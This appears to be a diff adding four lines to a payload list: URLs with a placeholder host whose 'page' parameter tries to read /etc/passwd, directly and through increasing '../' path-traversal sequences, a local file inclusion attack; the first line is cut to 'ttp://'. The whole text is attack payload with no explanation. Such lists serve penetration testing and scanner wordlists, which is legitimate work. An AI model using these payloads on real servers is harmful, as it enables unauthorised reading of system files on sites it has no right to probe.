@@ -1,0 +1,4 @@
+ttp://xxxx/?page=/etc/passwd
+http://xxxx/?page=../etc/passwd
+http://xxxx/?page=../../etc/passwd
+http://xxxx/?page=../../../../../../etc/passwd
